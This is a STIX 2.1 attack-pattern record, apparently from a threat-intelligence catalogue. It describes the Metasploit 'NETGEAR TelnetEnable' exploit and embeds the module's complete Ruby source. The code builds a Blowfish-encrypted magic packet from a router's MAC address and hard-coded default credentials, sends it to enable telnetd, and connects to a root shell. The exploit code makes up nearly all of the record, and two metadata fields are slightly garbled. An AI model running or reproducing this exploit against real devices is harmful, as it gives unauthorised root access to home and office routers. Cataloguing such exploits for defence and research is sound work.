{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f6635961-7c3f-4109-953f-ef4b3b35ed36",
    "created": "2024-08-14T16:57:06.138426Z",
    "modified": "2024-08-14T16:57:06.138431Z",
    "name": "NETGEAR TelnetEnable",
    "description": " This module sends a magic packet to a NETGEAR device to enable telnetd. Upon successful connect, a root shell should be presented to the user. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/telnet/netgear_telnetenable.rb",
            "external_id": "netgear_telnetenable.rb"
        },
        {
            "source_name": "reference",
            "url": "https://wiki.openwrt.org/toh/netgear/telnet.console"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/cyanitol/netgear-telenetenable"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/insanid/netgear-telenetenable"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Udp\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Capture\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'               => 'NETGEAR TelnetEnable',\n      'Description'        => %q{\n        This module sends a magic packet to a NETGEAR device to enable telnetd.\n        Upon successful connect, a root shell should be presented to the user.\n      },\n      'Author'             => [\n        'Paul Gebheim', # Python PoC (TCP)\n        'insanid',      # Python PoC (UDP)\n        'wvu'           # Metasploit module\n      ],\n      'References'         => [\n        ['URL', 'https://wiki.openwrt.org/toh/netgear/telnet.console'],\n        ['URL', 'https://github.com/cyanitol/netgear-telenetenable'],\n        ['URL', 'https://github.com/insanid/netgear-telenetenable']\n      ],\n      'DisclosureDate'     => '2009-10-30', # Python PoC (TCP)\n      'License'            => MSF_LICENSE,\n      'Platform'           => 'unix',\n      'Arch'               => ARCH_CMD,\n      'Privileged'         => true,\n      'Payload'            => {\n        'Compat'           => {\n          'PayloadType'    => 'cmd_interact',\n          'ConnectionType' => 'find'\n        }\n      },\n      'Targets'            => [\n        ['Automatic (detect TCP or UDP)',\n          proto:    :auto\n        ],\n        ['TCP (typically older devices)',\n          proto:    :tcp,\n          username: 'Gearguy',\n          password: 'Geardog'\n        ],\n        ['UDP (typically newer devices)',\n          proto:    :udp,\n          username: 'admin',\n          password: 'password'\n        ]\n      ],\n      'DefaultTarget'      => 0\n    ))\n\n    register_options([\n      Opt::RPORT(23),\n      OptString.new('MAC',      [false, 'MAC address of device']),\n      OptString.new('USERNAME', [false, 'Username on device']),\n      OptString.new('PASSWORD', [false, 'Password on device'])\n    ])\n  end\n\n  def post_auth?\n    true\n  end\n\n  def default_credential?\n    true\n  end\n\n  def check\n    # Run through protocol detection\n    detect_proto\n\n    # This is a gamble, but it's the closest we can get\n    if @proto == :tcp\n      CheckCode::Detected\n    else\n      CheckCode::Unknown\n    end\n  end\n\n  def exploit\n    # Try to do the exploit unless telnetd is detected\n    @do_exploit = true\n\n    # Detect TCP or UDP and presence of telnetd\n    @proto = target[:proto]\n    detect_proto if @proto == :auto\n\n    if @do_exploit\n      # Use supplied or ARP-cached MAC address\n      configure_mac\n      # Use supplied or default creds\n      configure_creds\n      # Shell it\n      exploit_telnetenabled\n    end\n\n    # Connect to the shell\n    connect_telnetd\n  end\n\n  def detect_proto\n    begin\n      connect\n\n      res = begin\n        sock.get_once || ''\n      rescue EOFError\n        ''\n      end\n\n      # telnetenabled returns no data, unlike telnetd\n      if res.length == 0\n        print_good('Detected telnetenabled on TCP')\n      else\n        print_good('Detected telnetd on TCP')\n        @do_exploit = false\n      end\n\n      @proto = :tcp\n    # It's UDP... and we may not get an ICMP error...\n    rescue Rex::ConnectionError\n      print_good('Detected telnetenabled on UDP')\n      @proto = :udp\n    ensure\n      disconnect\n    end\n  end\n\n  def configure_mac\n    @mac = datastore['MAC']\n\n    return if @mac\n\n    print_status('Attempting to discover MAC address via ARP')\n\n    begin\n      open_pcap\n      @mac = lookup_eth(rhost).first\n    rescue RuntimeError => e\n      fail_with(Failure::BadConfig, \"#{e}. Are you root?\")\n    ensure\n      close_pcap\n    end\n\n    if @mac\n      print_good(\"Found MAC address #{@mac}\")\n    else\n      fail_with(Failure::Unknown, 'Could not find MAC address')\n    end\n  end\n\n  def configure_creds\n    @username = datastore['USERNAME'] || target[:username]\n    @password = datastore['PASSWORD'] || target[:password]\n\n    # Try to use default creds if no creds were found\n    unless @username && @password\n      tgt = targets.find { |t| t[:proto] == @proto }\n      @username = tgt[:username]\n      @password = tgt[:password]\n    end\n\n    print_good(\"Using creds #{@username}:#{@password}\")\n  end\n\n  def exploit_telnetenabled\n    print_status('Generating magic packet')\n    payload = magic_packet(@mac, @username, @password)\n\n    begin\n      print_status(\"Connecting to telnetenabled via #{@proto.upcase}\")\n      @proto == :tcp ? connect : connect_udp\n      print_status('Sending magic packet')\n      @proto == :tcp ? sock.put(payload) : udp_sock.put(payload)\n    rescue Rex::ConnectionError\n      fail_with(Failure::Disconnected, 'Something happened mid-connection!')\n    ensure\n      print_status('Disconnecting from telnetenabled')\n      @proto == :tcp ? disconnect : disconnect_udp\n    end\n\n    # Wait a couple seconds for telnetd to come up\n    print_status('Waiting for telnetd')\n    sleep(2)\n  end\n\n  def connect_telnetd\n    print_status('Connecting to telnetd')\n    connect\n    handler(sock)\n  end\n\n  # NOTE: This is almost a verbatim copy of the Python PoC\n  def magic_packet(mac, username, password)\n    mac = mac.gsub(/[:-]/, '').upcase\n\n    if mac.length != 12\n      fail_with(Failure::BadConfig, 'MAC must be 12 bytes without : or -')\n    end\n    just_mac = mac.ljust(0x10, \"\\x00\")\n\n    if username.length > 0x10\n      fail_with(Failure::BadConfig, 'USERNAME must be <= 16 bytes')\n    end\n    just_username = username.ljust(0x10, \"\\x00\")\n\n    if @proto == :tcp\n      if password.length > 0x10\n        fail_with(Failure::BadConfig, 'PASSWORD must be <= 16 bytes')\n      end\n      just_password = password.ljust(0x10, \"\\x00\")\n    elsif @proto == :udp\n      # Thanks to Roberto Frenna for the reserved field analysis\n      if password.length > 0x21\n        fail_with(Failure::BadConfig, 'PASSWORD must be <= 33 bytes')\n      end\n      just_password = password.ljust(0x21, \"\\x00\")\n    end\n\n    cleartext = (just_mac + just_username + just_password).ljust(0x70, \"\\x00\")\n    md5_key = Rex::Text.md5_raw(cleartext)\n\n    payload = byte_swap((md5_key + cleartext).ljust(0x80, \"\\x00\"))\n\n    secret_key = 'AMBIT_TELNET_ENABLE+' + password\n\n    byte_swap(blowfish_encrypt(secret_key, payload))\n  end\n\n  def blowfish_encrypt(secret_key, payload)\n    cipher = OpenSSL::Cipher.new('bf-ecb').encrypt\n\n    cipher.padding = 0\n    cipher.key_len = secret_key.length\n    cipher.key     = secret_key\n\n    cipher.update(payload) + cipher.final\n  end\n\n  def byte_swap(data)\n    data.unpack('N*').pack('V*')\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2009-10-30, # Python PoC TCP",
    "x_mitre_platforms": [
        "unix'"
    ]
}